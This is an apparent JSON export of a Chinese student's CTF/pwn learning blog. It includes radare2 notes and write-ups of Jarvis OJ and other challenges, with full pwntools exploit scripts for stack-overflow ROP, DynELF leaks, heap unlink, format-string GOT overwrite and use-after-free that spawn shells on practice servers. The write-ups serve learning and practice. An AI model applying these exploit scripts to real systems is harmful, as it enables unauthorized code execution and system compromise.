{"meta":{"title":"Room of Equirement","subtitle":"pwn what you want","description":"pwn菜鸡一枚","author":"Sirius Whiter","url":"http://siriuswhiter.tk"},"pages":[{"title":"About Me","date":"2018-08-24T04:15:58.000Z","updated":"2018-08-24T05:21:32.074Z","comments":true,"path":"about/index.html","permalink":"http://siriuswhiter.tk/about/index.html","excerpt":"","text":"I’m Sirius Whiter,a sophomore at CUG,pwn noob.Bosses do light spray.contact me at github:siriuswhiterFor the pwn is long and full of terrors"},{"title":"categories","date":"2018-08-24T04:17:06.000Z","updated":"2018-08-24T04:17:06.852Z","comments":true,"path":"categories/index.html","permalink":"http://siriuswhiter.tk/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2018-08-24T04:17:49.000Z","updated":"2018-08-24T04:17:49.342Z","comments":true,"path":"archives/index.html","permalink":"http://siriuswhiter.tk/archives/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-08-24T04:16:44.000Z","updated":"2018-08-25T02:05:49.548Z","comments":true,"path":"tags/index.html","permalink":"http://siriuswhiter.tk/tags/index.html","excerpt":"","text":"-skills -pwn -RE"}],"posts":[{"title":"Radare2","slug":"radare2","date":"2018-09-25T02:56:08.000Z","updated":"2018-09-25T05:01:44.785Z","comments":true,"path":"2018/09/25/radare2/","link":"","permalink":"http://siriuswhiter.tk/2018/09/25/radare2/","excerpt":"","text":"之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm 安装git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 使用之后学习使用中逐渐更新常用包含工具： radare2-&gt;整合了所有工具 rabin2-&gt;查看文件格式的 radiff2-&gt;比较文件不同的 rahash2-&gt;各种密码算法，hash算法集成 rasm2-&gt;汇编和反汇编 ragg2-&gt;开发shellcode工具(radare2自己编写的编译器) radare2随便加载个文件,会有一句欢迎语hhhh 123$r2 pwnme -- We only have bugs, features are an unintended side-effect[0x08049090]&gt; //工具找到的入口位置 rabin2查看文件基本信息 123456789101112131415161718192021222324252627282930# rabin2 -I pwnmearch x86baddr 0x8048000binsz 14275bintype elfbits 32canary falsesanitiz falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true rahash2支持超多加解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# rahash2 -L //列举Available Hashes: h md5h sha1h sha256h sha384h sha512h md4h xorh xorpairh parityh entropyh hamdisth pcprinth mod255h xxhashh adler32h luhnh crc8smbush crc15canh crc16h crc16hdlch crc16usbh crc16citth crc24h crc32h crc32ch crc32ecma267h crc32bzip2h crc32dh crc32mpeg2h crc32posixh crc32qh crc32jamcrch crc32xferh crc64h crc64ecmah crc64weh crc64xzh crc64isoAvailable Encoders/Decoders: e base64e base91e punycodeAvailable Crypto Algos: c rc2c rc4c rc6c aes-ecbc aes-cbcc rorc rolc rotc blowfishc cps2c des-ecbc xorc serpent-ecb# rahash2 -a md5 ./pwnme //生成md5哈希./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56 rasm2支持汇编反汇编 ragg2据说可以用来快速开发shellcode？ radiff2支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。 P.S.暂时不晓得有啥用 rafind2在文件中查找字节模式 rarun2用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和 覆盖的默认文件描述符。 rarun2可用于： * 破解小程序 * 模糊测试 * 测试组件 rax2用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示， 十六进制字符串到ASCII之间进行基本转换，八进制到整数等。 它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。 常用命令 i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串 1234567891011[0x08049090]&gt; ie[Entrypoints]vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints[0x08049090]&gt; iz[Strings]Num Vaddr Paddr Len Size Section Type String000 0x00002008 0x0804a008 7 8 (.rodata) ascii /bin/sh001 0x00002010 0x0804a010 5 6 (.rodata) ascii input a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme) 12345678# r2 -A pwnme[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)[x] Type matching analysis for all functions (afta)[x] Use -AA or aaaa to perform additional experimental analysis. -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 ，一个 flag 是所有类似特征的集合。可以使用 ‘fs ‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’). 1234567891011[0x08049090]&gt; fs0 2 * strings1 37 * symbols2 30 * sections3 12 * segments4 5 * relocs5 5 * imports6 2 * functions[0x08049090]&gt; fs strings;f0x0804a008 8 str.bin_sh0x0804a010 6 str.input axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。 vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。) 12345678910111213141516171819202122232425-[ functions ]----------------- pdf ---(a) add (x) xrefs (q) quit (jk) next/prev ;-- section..text:(r) rename (c) calls (g) go (tab) column ;-- eip:(d) delete (v) vars (?) help (:) enter cmd / (fcn) entry0 50&gt;* 0x08049090 50 entry0 | entry0 (); 0x080490c3 4 fcn.080490c3 | 0x08049090 xor ebp, ebp ; [14] -r-x secti 0x08049070 6 sym.imp.__libc_start_main | 0x08049092 pop esi 0x080490f0 40 sym.deregister_tm_clones | 0x08049093 mov ecx, esp 0x08049130 53 sym.register_tm_clones | 0x08049095 and esp, 0xfffffff0 0x08049170 30 sym.__do_global_dtors_aux | 0x08049098 push eax 0x080491a0 2 entry1.init | 0x08049099 push esp 0x080492b0 2 sym.__libc_csu_fini | 0x0804909a push edx 0x080490e0 4 sym.__x86.get_pc_thunk.bx | 0x0804909b call fcn.080490c3 0x080492b4 20 sym._fini | 0x080490a0 add ebx, 0x2f60 ; &apos;`/&apos; 0x08049250 93 sym.__libc_csu_init | 0x080490a6 lea eax, [ebx - 0x2d50] 0x080490d0 2 sym._dl_relocate_static_pie | 0x080490ac push eax ; func fini 0x08049203 65 sym.main | 0x080490ad lea eax, [ebx - 0x2db0] 0x08049244 4 sym.__x86.get_pc_thunk.ax | 0x080490b3 push eax ; func init 0x08049050 6 sym.imp.puts | 0x080490b4 push ecx ; char **ubp_av 0x080491cd 54 sym.vulnerable | 0x080490b5 push esi ; int argc 0x08049040 6 sym.imp.gets | 0x080490b6 mov eax, sym.main ; 0x8049203 0x080491a2 43 sym.flag | 0x080490bc push eax ; func main 0x08049060 6 sym.imp.system \\ 0x080490bd call sym.imp.__libc_start_main ; int __libc_star 0x08049000 35 sym._init 0x08049080 6 sub.__gmon_start_80 s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。 12345678910111213141516171819202122232425262728293031[0x08049090]&gt; s main[0x08049203]&gt; pdf ;-- main:/ (fcn) sym.main 65| sym.main (int argc, char **argv, char **envp);| ; var int local_8h @ ebp-0x8| ; arg int arg_4h @ esp+0x4| ; DATA XREF from entry0 (0x80490b6)| 0x08049203 8d4c2404 lea ecx, [arg_4h] ; 4| 0x08049207 83e4f0 and esp, 0xfffffff0| 0x0804920a ff71fc push dword [ecx - 4]| 0x0804920d 55 push ebp| 0x0804920e 89e5 mov ebp, esp| 0x08049210 53 push ebx| 0x08049211 51 push ecx| 0x08049212 e82d000000 call sym.__x86.get_pc_thunk.ax| 0x08049217 05e92d0000 add eax, 0x2de9| 0x0804921c 83ec0c sub esp, 0xc| 0x0804921f 8d9010e0ffff lea edx, [eax - 0x1ff0]| 0x08049225 52 push edx ; const char *s| 0x08049226 89c3 mov ebx, eax| 0x08049228 e823feffff call sym.imp.puts ; int puts(const char *s)| 0x0804922d 83c410 add esp, 0x10| 0x08049230 e898ffffff call sym.vulnerable| 0x08049235 b800000000 mov eax, 0| 0x0804923a 8d65f8 lea esp, [local_8h]| 0x0804923d 59 pop ecx| 0x0804923e 5b pop ebx| 0x0804923f 5d pop ebp| 0x08049240 8d61fc lea esp, [ecx - 4]\\ 0x08049243 c3 ret radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样 12345678910111213141516171819202122232425262728293031323334[0x08049203]&gt; pdcfunction sym.main () &#123; // 1 basic blocks loc_0x8049203: //DATA XREF from entry0 (0x80490b6) ecx = [arg_4h] //4 esp &amp;= 0xfffffff0 //ebp push dword [ecx - 4] push ebp ebp = esp push ebx push ecx sym.__x86.get_pc_thunk.ax () eax += 0x2de9 //obj._GLOBAL_OFFSET_TABLE esp -= 0xc edx = [eax - 0x1ff0] //&quot;input&quot; str.input push edx //const char *s ; (pstr 0x0804a010) &quot;input&quot; ebx = eax //obj._GLOBAL_OFFSET_TABLE int puts(const char * s : (*0x804a010)0x00177fe0 = input) esp += 0x10 sym.vulnerable () eax = 0 esp = [local_8h] pop ecx pop ebx //ebp esp = [ecx - 4] //ebp return(break)&#125; 还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞 .---------------------------------------------------. | [0x8049203] | | ;-- main: | | ;-- eip: | | (fcn) sym.main 65 | | sym.main (int argc, char **argv, char **envp); | | ; var int local_8h @ ebp-0x8 | | ; arg int arg_4h @ esp+0x4 | | ; DATA XREF from entry0 (0x80490b6) | | ; 4 | | lea ecx, [arg_4h] | | and esp, 0xfffffff0 | | push dword [ecx - 4] | | push ebp | | mov ebp, esp | | push ebx | | push ecx | | call sym.__x86.get_pc_thunk.ax;[ga] | | add eax, 0x2de9 | | sub esp, 0xc | | lea edx, [eax - 0x1ff0] | | ; const char *s | | push edx | | mov ebx, eax | | ; int puts(const char *s) | | call sym.imp.puts;[gb] | | add esp, 0x10 | | call sym.vulnerable;[gc] | | mov eax, 0 | | lea esp, [local_8h] | `---------------------------------------------------&apos; 目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。","categories":[],"tags":[]},{"title":"Jarvis OJ-pwn","slug":"jarvis-oj-pwn","date":"2018-09-13T06:17:19.000Z","updated":"2018-09-22T03:05:16.630Z","comments":true,"path":"2018/09/13/jarvis-oj-pwn/","link":"","permalink":"http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/","excerpt":"","text":"开始漫漫刷题之路 level4 - DynELF题目给的东西很少，基本信息如下： 信息main：123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function：123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; 保护：只开启了nx。123456&apos;/root/pwnprac/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 分析read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。/bin/sh则可以通过调用read来将其写入bss段，调用即可。 poc1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./level4&apos;)sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)libc = ELF(&apos;./level4&apos;)bss_add = libc.bss() //直接得到bss段地址def leak(add): //leak函数 pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4) sh.send(pay1) data = sh.recv(4) return data#神奇DynELF工具使用d = DynELF(leak,elf = ELF(&apos;./level4&apos;)) //初始化DynELF模块 sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) //在libc文件中搜索system函数的地址 print hex(sys_add)pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8) //调用readsh.send(pay2)sh.send(&apos;/bin/sh\\x00&apos;) pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)sh.send(pay3)sh.interactive() 获得shell1234[*] Switching to interactive mode$ whoamictf$ 参考:借助DynELF实现无libc的漏洞利用小结 level3_x64 - 64位参数传递当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸重新下载源文件，问题解决。。。 信息：漏洞函数：明显的栈溢出1234567ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, &amp;buf, 0x200uLL);&#125; 思路：整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。 poc：1234567891011121314151617181920212223242526272829303132from pwn import *#context.log_level = &apos;debug&apos;sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)#sh = process(&apos;level3&apos;)pwn = ELF(&apos;level3_x64&apos;)libc = ELF(&apos;libc-2.19.so&apos;)pop_rdi_ret = 0x004006b3 #pop rdi ; retpop_rsi_r15_ret = 0x004006b1 #pop rsi ; pop r15 ; retsys_libc_addr = libc.symbols[&apos;system&apos;]binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()#----------To get write.got--------------# pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1) //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.recvuntil(&quot;Input:\\n&quot;)sh.send(pay1)write_addr = u64(sh.recv(8))#---------call system func---------------#sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addrbinsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addrpay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)sh.send(pay2)sh.interactive() 获得shell： 123$ whoamictf$ —之后再做— level6 - 堆的unlink利用正常的选项类型题 信息main:12345678910111213141516171819202122232425262728293031323334353637int __cdecl main()&#123; unsigned int v0; // eax alarm_func(); main_ptr(); while ( 1 ) &#123; v0 = menu();LABEL_3: switch ( v0 ) &#123; case 1u: list(); continue; case 2u: add(); continue; case 3u: edit(); continue; case 4u: delete(); v0 = menu(); if ( v0 &gt; 5 ) goto LABEL_6; goto LABEL_3; case 5u: puts(&quot;Bye&quot;); return 0; default:LABEL_6: puts(&quot;Invalid!&quot;); break; &#125; &#125;&#125; 问题函数：delete函数未检查inuse位，可以double free，且free完并未清空指针。 12345678910111213141516171819202122int delete()&#123; int v0; // eax int v1; // edx int v3; // eax if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 ) return puts(&quot;No notes yet.&quot;); printf(&quot;Note number: &quot;); v0 = get_num(); if ( v0 &lt; 0 ) return puts(&quot;Invalid number!&quot;); v1 = dword_804A2EC; if ( v0 &gt;= *(_DWORD *)dword_804A2EC ) return puts(&quot;Invalid number!&quot;); --*(_DWORD *)(dword_804A2EC + 4); v3 = v1 + 12 * v0; *(_DWORD *)(v3 + 8) = 0; *(_DWORD *)(v3 + 12) = 0; free(*(void **)(v3 + 16)); return puts(&quot;Done.&quot;);&#125; 同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。 保护：（基本上不用看。。） 123456[*] &apos;/root/pwnprac/freenote_x86&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 思路(有点迷) 首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。 之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) poc（待参透）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *#context.log_level = &apos;debug&apos;context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]local = 0if local: cn = process(&quot;./freenote_x86&quot;) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;libc-2.19.so&quot;)def list_post(): passdef add_post(length,content): cn.sendline(&apos;2&apos;) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def edit_post(idx,length,content): cn.sendline(&apos;3&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx)) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def del_post(idx): cn.sendline(&apos;4&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx))chunk_list=0x0804A2ECtest=0x08048CC5#-------init-------for i in range(5): add_post(0x80,str(i)*0x80)del_post(3)del_post(1)pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8edit_post(0,0x88,pay)#------------------#--------leak----------cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;a&apos;*0x8)leak_addr = u32(cn.recv(4))cn.recv()heap_base = leak_addr - 0xdb0#offsetchunk0_addr = heap_base + 0x18success(&quot;leak_addr: &quot;+hex(leak_addr))success(&quot;heap_base: &quot;+hex(heap_base))success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))#----------------------#-------unlink--------pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)pay += p32(0x80) + p32(0x88+0x88)edit_post(0,len(pay),pay)del_post(1)#----------------------#--------leak----------pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])pay += &apos;\\x00&apos;*(0x88-len(pay))edit_post(0,len(pay),pay)cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;0. &apos;)cn.recvuntil(&apos;1. &apos;)strtol = cn.recvuntil(&apos;\\x0a&apos;)[:-1]cn.recv()strtol = u32(strtol)system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]success(&quot;strtol: &quot;+hex(strtol))success(&quot;system: &quot;+hex(system))#----------------------#--------hijack&amp;getshell--------edit_post(1,4,p32(system))cn.sendline(&quot;$0&quot;)#----------------------cn.interactive() 获得shell 123Your choice: $ whoamictf$","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"}]},{"title":"pwn-300解析-格式化字符串漏洞利用巩固","slug":"pwn-300解析-格式化字符串漏洞利用巩固","date":"2018-09-11T01:51:39.000Z","updated":"2018-09-11T02:41:42.658Z","comments":true,"path":"2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","link":"","permalink":"http://siriuswhiter.tk/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","excerpt":"","text":"pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。 查看内容及保护main函数为：1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+Ch] [ebp-4Ch] unsigned int v5; // [esp+4Ch] [ebp-Ch] v5 = __readgsdword(0x14u); //canary生成 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); fgets(&amp;s, 64, stdin); //fgets,遇/x00停止 printf(&amp;s); //格式化字符串漏洞 fgets(&amp;s, 64, stdin); printf(&amp;s); return 0;&#125; 查看文件保护仍然是canary 与 栈不可执行； 1234567root@xuewenjie-kali:~/tikool# checksec binary_300[*] &apos;/root/tikool/binary_300&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 查看加载函数发现system函数 加载函数 确定思路想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell； 流程实现确定字符串位置123root@xuewenjie-kali:~/tikool# ./binary_300aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e 即字符串位于第六（相对于）或第七个（相对于） exp如下： 1234567891011121314151617from pwn import *#sh = process(&apos;./binary_300&apos;)sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)libc = ELF(&apos;./binary_300&apos;)printf_got = libc.got[&apos;printf&apos;]system_add = libc.symbols[&apos;system&apos;]payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;) //pwntools自带，用于生成格式化字符串payload；print payloadsh.sendline(payload)sh.recv()sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 成功获得shell12345[*] Switching to interactive mode$ /bin/sh$ whoamictf$","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"}]},{"title":"pwn 入门1.3--plt/got","slug":"pwn-入门1-3-plt-got","date":"2018-08-28T04:12:56.000Z","updated":"2018-09-03T13:45:49.643Z","comments":true,"path":"2018/08/28/pwn-入门1-3-plt-got/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/","excerpt":"","text":"&lt;center&gt;关于ret2libc 中的plt/got&lt;/center&gt; 延迟绑定即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。 使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；* plt 与 got文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的） 由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。 ret2libc的实现 文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出； 图一](pwn-入门1-3-plt-got/checksec.png) ![图二 查看应用调用函数plt表，objdump -d -M intel -j .plt pwnme可以看到没有调用system，需要我们利用其它已调用的来泄露； 图三 这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址； 123pwn = ELF(&apos;pwnme&apos;) sh.recvuntil(&apos;flag:&apos;) wri_got = pwn.got[&apos;write&apos;] 泄露libc中的system与/bin/sh地址 123libc = ELF(&apos;libc-2.19.so&apos;)sys_got = wri_got - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]binsh_got = wri_got - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next() 构造payload payload = flat([&#39;a&#39;*20 , sys_got , 0xdeadbeef , binsh_got]) 因为某些不知名的原因，各个偏移得到的got地址并不是特别对，所以先不放wp。之后再补","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"}]},{"title":"pwn 入门n.n","slug":"pwn-入门n-n","date":"2018-08-28T03:10:56.000Z","updated":"2018-08-28T03:19:20.274Z","comments":true,"path":"2018/08/28/pwn-入门n-n/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门n-n/","excerpt":"","text":"堆的UAF(use after free)利用学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，只能看了下pwn的tips，开始现学现卖。 原理就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。 根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。 漏洞的简单利用1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void evil_fuc(char command[])&#123;system(command);&#125;void echo(char content[])&#123;printf(&quot;%s&quot;,content);&#125;int main()&#123; func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(&quot;malloc addr: %p\\n&quot;,p1); p1[3]=echo; p1[3](&quot;hello world\\n&quot;); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1[3](&quot;hello again\\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态 func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(&quot;malloc addr: %p\\n&quot;,p2); printf(&quot;malloc addr: %p\\n&quot;,p1);//p2与p1指针指向的内存为同一地址 p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p1[3](&quot;/bin/sh&quot;); return 0;&#125; 最终运行效果： result 漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程 学习借鉴文章来源：https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"}]},{"title":"pwn.入门1.2","slug":"pwn-入门1-2","date":"2018-08-28T01:46:58.000Z","updated":"2018-08-28T01:55:07.624Z","comments":true,"path":"2018/08/28/pwn-入门1-2/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-2/","excerpt":"","text":"ret2libc学习 ret2libc使用原因程序不是静态编译，通常就不会有int 0x80 ret2syscall 就无法实现，因而使用 ret2library。 调用函数的栈结构布局 ： 调用函数的返回地址 函数调用完的返回地址 调用函数的参数1 调用函数的参数2 利用过程分析：ASLR使得每次载入的函数地址（base）都不同 实际地址 Address = base +offset 若地址为 0xf… 则其为实际地址； offset在libc库中是固定的； 查看libc库版本： 12ldd ./file 寻找偏移地址 ： 1readelf -a /lib32/libc.so.6 | grep gets@ 目标是寻找libc 的 base : 1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset 2.从stack残渣中获取libc地址信息 延迟绑定（没搞清楚，之后再写）函数调用方式： call func@plt –&gt; .got.plt –&gt;.got.plt的值为该func的实际地址（所需address） 使用调用函数的栈结构布局：1. 123456789101112gets()pop1_ret(pop&lt;buf&gt; 然后 return）&lt;buf&gt;system()xxx&lt;buf&gt; 2. 